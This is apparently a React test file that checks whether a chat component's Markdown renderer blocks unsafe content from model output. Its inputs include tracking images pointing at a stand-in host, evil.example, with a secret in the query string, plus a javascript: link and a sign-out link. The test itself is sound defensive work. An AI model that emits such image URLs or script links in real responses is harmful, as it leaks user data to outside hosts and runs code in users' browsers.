import { fireEvent, render, screen } from "@testing-library/react";
import { expect, it } from "vitest";

import { MessageResponse } from "../src/ai-elements/message";

it("model Markdown cannot load tracking images or unsafe links", () => {
  const { container } = render(
    <MessageResponse mode="static">{`
![tracking](https://evil.example/track?secret=1)

<img src="https://evil.example/raw" />

[secure](https://example.com/docs)

[insecure](http://evil.example)

[relative](/api/auth/sign-out)

[script](javascript:alert%281%29)
`}</MessageResponse>,
  );
  expect(container.querySelector("img")).toBeNull();
  fireEvent.click(screen.getByRole("button", { name: "secure" }));
  expect(screen.getByText("https://example.com/docs")).toBeTruthy();
  for (const name of ["insecure", "relative", "script"]) {
    expect(
      screen
        .getByText(new RegExp(`^${name}`))
        .closest("a")
        ?.getAttribute("href") ?? null,
    ).toBeNull();
  }
});
